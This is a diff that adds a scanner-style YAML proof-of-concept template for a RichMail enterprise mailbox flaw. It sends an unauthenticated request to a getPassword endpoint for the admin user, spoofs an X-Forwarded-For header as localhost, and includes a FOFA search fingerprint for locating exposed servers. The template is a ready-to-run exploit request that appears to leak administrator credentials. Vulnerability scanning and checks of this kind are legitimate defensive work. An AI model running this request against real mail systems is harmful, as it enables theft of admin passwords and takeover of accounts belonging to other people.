@@ -1,0 +1,16 @@
+id: poc-yaml-richmail-information-leakage
+info:
+  name: RichMail 企业邮箱敏感信息泄漏漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: RichMail
+  FOFA: Richmail 企业邮箱
+requests:
+- method: GET
+  path: /RmWeb/noCookiesMail?func=user:getPassword&userMailName=admin
+  headers:
+    X-Forwarded-For: 127.0.0.1
+  expression: status_code == 200 && contains(body,"S_OK") && contains(body,"errorMsg")
+variables: {}
+transport: http
